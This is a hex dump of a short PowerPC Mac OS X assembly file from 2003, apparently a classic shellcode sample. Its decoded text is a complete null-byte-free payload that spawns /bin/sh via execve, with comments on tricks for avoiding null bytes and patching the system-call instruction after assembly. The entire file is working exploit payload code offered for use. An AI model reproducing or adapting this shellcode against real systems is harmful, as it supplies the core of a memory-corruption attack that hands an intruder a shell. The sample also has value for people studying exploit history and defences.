00000000  3b 3b 3b 20 24 49 64 3a  20 70 70 63 2d 65 78 65  |;;; $Id: ppc-exe|
00000010  63 76 65 2e 73 2c 76 20  31 2e 31 20 32 30 30 33  |cve.s,v 1.1 2003|
00000020  2f 30 33 2f 30 31 20 30  31 3a 31 30 3a 34 38 20  |/03/01 01:10:48 |
00000030  67 68 61 6e 64 69 20 45  78 70 20 24 0d 0a 3b 3b  |ghandi Exp $..;;|
00000040  3b 20 50 50 43 20 4d 61  63 4f 53 20 58 20 28 6d  |; PPC MacOS X (m|
00000050  61 79 62 65 20 6f 74 68  65 72 73 29 20 73 68 65  |aybe others) she|
00000060  6c 6c 63 6f 64 65 0d 0a  3b 3b 3b 0d 0a 3b 3b 3b  |llcode..;;;..;;;|
00000070  20 41 66 74 65 72 20 61  73 73 65 6d 62 6c 79 2c  | After assembly,|
00000080  20 63 68 61 6e 67 65 20  62 79 74 65 73 20 32 20  | change bytes 2 |
00000090  61 6e 64 20 33 20 6f 66  20 74 68 65 20 27 73 63  |and 3 of the 'sc|
000000a0  27 20 69 6e 73 74 72 75  63 74 69 6f 6e 20 65 6e  |' instruction en|
000000b0  63 6f 64 69 6e 67 0d 0a  3b 3b 3b 20 66 72 6f 6d  |coding..;;; from|
000000c0  20 30 78 30 30 20 74 6f  20 30 78 66 66 2e 0d 0a  | 0x00 to 0xff...|
000000d0  3b 3b 3b 0d 0a 3b 3b 3b  20 67 68 61 6e 64 69 20  |;;;..;;; ghandi |
000000e0  3c 20 67 68 61 6e 64 69  40 6d 69 6e 64 6c 65 73  |< ghandi@mindles|
000000f0  73 2e 63 6f 6d 20 3e 0d  0a 3b 3b 3b 0d 0a 09 0d  |s.com >..;;;....|
00000100  0a 2e 67 6c 6f 62 6c 20  5f 65 78 65 63 76 65 5f  |..globl _execve_|
00000110  62 69 6e 73 68 0d 0a 2e  74 65 78 74 0d 0a 5f 65  |binsh...text.._e|
00000120  78 65 63 76 65 5f 62 69  6e 73 68 3a 0d 0a 20 20  |xecve_binsh:..  |
00000130  20 20 09 3b 3b 20 44 6f  6e 27 74 20 62 72 61 6e  |  .;; Don't bran|
00000140  63 68 2c 20 62 75 74 20  64 6f 20 6c 69 6e 6b 2e  |ch, but do link.|
00000150  20 20 54 68 69 73 20 67  69 76 65 73 20 75 73 20  |  This gives us |
00000160  74 68 65 20 6c 6f 63 61  74 69 6f 6e 20 6f 66 0d  |the location of.|
00000170  0a 09 3b 3b 20 6f 75 72  20 63 6f 64 65 2e 20 20  |..;; our code.  |
00000180  4d 6f 76 65 20 74 68 65  20 61 64 64 72 65 73 73  |Move the address|
00000190  20 69 6e 74 6f 20 47 50  52 20 33 31 2e 0d 0a 09  | into GPR 31....|
000001a0  78 6f 72 2e 09 72 35 2c  20 72 35 2c 20 72 35 09  |xor..r5, r5, r5.|
000001b0  3b 20 72 35 20 3d 20 4e  55 4c 4c 0d 0a 09 62 6e  |; r5 = NULL...bn|
000001c0  65 6c 09 5f 65 78 65 63  76 65 5f 62 69 6e 73 68  |el._execve_binsh|
000001d0  0d 0a 09 6d 66 6c 72 09  72 33 31 0d 0a 0d 0a 09  |...mflr.r31.....|
000001e0  3b 3b 20 55 73 65 20 74  68 65 20 6d 61 67 69 63  |;; Use the magic|
000001f0  20 6f 66 66 73 65 74 20  63 6f 6e 73 74 61 6e 74  | offset constant|
00000200  20 32 36 38 20 62 65 63  61 75 73 65 20 69 74 20  | 268 because it |
00000210  6d 61 6b 65 73 20 74 68  65 0d 0a 20 20 20 20 20  |makes the..     |
00000220  20 20 20 3b 3b 20 69 6e  73 74 72 75 63 74 69 6f  |   ;; instructio|
00000230  6e 20 65 6e 63 6f 64 69  6e 67 73 20 6e 75 6c 6c  |n encodings null|
00000240  2d 62 79 74 65 20 66 72  65 65 2e 0d 0a 09 61 64  |-byte free....ad|
00000250  64 69 09 72 33 31 2c 20  72 33 31 2c 20 32 36 38  |di.r31, r31, 268|
00000260  2b 33 36 0d 0a 09 61 64  64 69 09 72 33 2c 20 72  |+36...addi.r3, r|
00000270  33 31 2c 20 2d 32 36 38  09 3b 20 72 33 20 3d 20  |31, -268.; r3 = |
00000280  70 61 74 68 0d 0a 0d 0a  20 20 20 20 20 20 20 20  |path....        |
00000290  3b 3b 20 43 72 65 61 74  65 20 61 72 67 76 5b 5d  |;; Create argv[]|
000002a0  20 3d 20 7b 70 61 74 68  2c 20 30 7d 20 69 6e 20  | = {path, 0} in |
000002b0  74 68 65 20 22 72 65 64  20 7a 6f 6e 65 22 20 6f  |the "red zone" o|
000002c0  6e 20 74 68 65 20 73 74  61 63 6b 0d 0a 09 73 74  |n the stack...st|
000002d0  77 09 72 33 2c 20 2d 38  28 72 31 29 09 3b 20 61  |w.r3, -8(r1).; a|
000002e0  72 67 76 5b 30 5d 20 3d  20 70 61 74 68 0d 0a 09  |rgv[0] = path...|
000002f0  73 74 77 09 72 35 2c 20  2d 34 28 72 31 29 09 3b  |stw.r5, -4(r1).;|
00000300  20 61 72 67 76 5b 31 5d  20 3d 20 4e 55 4c 4c 0d  | argv[1] = NULL.|
00000310  0a 09 73 75 62 69 09 72  34 2c 20 72 31 2c 20 38  |..subi.r4, r1, 8|
00000320  09 3b 20 72 34 20 3d 20  7b 70 61 74 68 2c 20 30  |.; r4 = {path, 0|
00000330  7d 0d 0a 0d 0a 09 3b 3b  20 35 39 20 3d 20 33 30  |}.....;; 59 = 30|
00000340  32 30 39 20 3e 3e 20 39  20 20 20 20 28 74 72 69  |209 >> 9    (tri|
00000350  63 6b 20 74 6f 20 61 76  6f 69 64 20 6e 75 6c 6c  |ck to avoid null|
00000360  2d 62 79 74 65 73 29 0d  0a 09 6c 69 09 72 33 30  |-bytes)...li.r30|
00000370  2c 20 33 30 32 30 39 20  0d 0a 09 73 72 61 77 69  |, 30209 ...srawi|
00000380  09 72 30 2c 20 72 33 30  2c 20 39 09 3b 20 72 30  |.r0, r30, 9.; r0|
00000390  20 3d 20 35 39 0d 0a 09  73 63 09 09 09 3b 20 65  | = 59...sc...; e|
000003a0  78 65 63 76 65 28 70 61  74 68 2c 20 61 72 67 76  |xecve(path, argv|
000003b0  2c 20 4e 55 4c 4c 29 0d  0a 70 61 74 68 3a 20 20  |, NULL)..path:  |
000003c0  20 2e 61 73 63 69 7a 20  22 2f 62 69 6e 2f 73 68  | .asciz "/bin/sh|
000003d0  22                                                |"|
000003d1
